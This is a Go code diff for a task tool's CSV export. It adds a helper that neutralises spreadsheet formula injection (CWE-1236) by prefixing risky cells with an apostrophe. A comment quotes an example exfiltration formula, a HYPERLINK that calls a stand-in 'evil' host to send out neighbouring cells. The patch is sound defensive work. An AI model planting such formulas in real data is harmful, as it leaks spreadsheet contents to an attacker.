@@ -9,6 +9,7 @@ import (
 	"log/slog"
 	"net/http"
 	"strconv"
+	"strings"
 
 	"github.com/danielgtaylor/huma/v2"
 	"github.com/google/uuid"
@@ -208,14 +209,20 @@ func writeCSV(w io.Writer, tasks []ExportedTask) {
 	_, _ = w.Write([]byte{0xEF, 0xBB, 0xBF})
 
 	cw := csv.NewWriter(w)
-	_ = cw.Write([]string{
+	write := func(cells []string) {
+		for i, cell := range cells {
+			cells[i] = neutraliseFormula(cell)
+		}
+		_ = cw.Write(cells)
+	}
+	write([]string{
 		"ID", "Title", "Description", "Status", "Priority",
 		"Due Date", "Start Date", "Completed At",
 		"Project ID", "Project", "Assignee ID", "Assignee",
 		"Updated At", "Created At",
 	})
 	for _, t := range tasks {
-		_ = cw.Write([]string{
+		write([]string{
 			t.ID,
 			t.Title,
 			handlerutil.DerefStr(t.Description),
@@ -223,13 +230,13 @@ func writeCSV(w io.Writer, tasks []ExportedTask) {
 			fmt.Sprintf("%d", t.Priority),
 			handlerutil.DerefStr(t.DueOn),
 			handlerutil.DerefStr(t.StartedOn),
-			handlerutil.FormatOptionalUnix(t.CompletedAt),
+			handlerutil.FormatOptionalUnixISO(t.CompletedAt),
 			t.ProjectID,
 			t.ProjectName,
 			handlerutil.DerefStr(t.AssigneeID),
 			handlerutil.DerefStr(t.AssigneeDisplayName),
-			handlerutil.FormatOptionalUnix(t.UpdatedAt),
-			handlerutil.FormatUnix(t.CreatedAt),
+			handlerutil.FormatOptionalUnixISO(t.UpdatedAt),
+			handlerutil.FormatUnixISO(t.CreatedAt),
 		})
 	}
 	cw.Flush()
@@ -238,6 +245,39 @@ func writeCSV(w io.Writer, tasks []ExportedTask) {
 // ----------------------------------------------------------------
 // Internal helpers
 // ----------------------------------------------------------------
+
+// formulaLeaders are the characters a spreadsheet reads as "this cell
+// is an expression" when it is the first one in the cell.
+const formulaLeaders = "=+-@\t\r"
+
+// neutraliseFormula stops a cell from being executed as a formula by
+// the program that opens the file.
+//
+// A task titled `=HYPERLINK("http://evil/?"&A1,"x")` is just a title
+// until someone exports the workspace and opens the result in a
+// spreadsheet, at which point the title runs and can send the cells
+// around it somewhere else (CWE-1236). Anyone who can name a task can
+// leave that waiting for whoever exports next, which is usually an
+// administrator looking at everything.
+//
+// Quoting the field does not help, and it is worth saying why, because
+// the CSV writer already quotes anything containing a comma or a
+// newline and it looks like protection. Quotes are consumed by the
+// parser: by the time the spreadsheet decides whether a cell is a
+// formula, the value it is looking at starts with the same character
+// it always did.
+//
+// The apostrophe is the mitigation spreadsheets themselves document,
+// and it is one ASCII byte a consumer can strip deterministically —
+// this repository's own CSV import does. A leading tab would also work
+// on Excel, but it is invisible, so a reader cannot tell the value was
+// altered, and importers trim leading whitespace inconsistently.
+func neutraliseFormula(cell string) string {
+	if cell == "" || !strings.ContainsRune(formulaLeaders, rune(cell[0])) {
+		return cell
+	}
+	return "'" + cell
+}
 
 // datasetQueryFailed converts a failed export query into the caller's
 // error, logging the driver error on the way out.
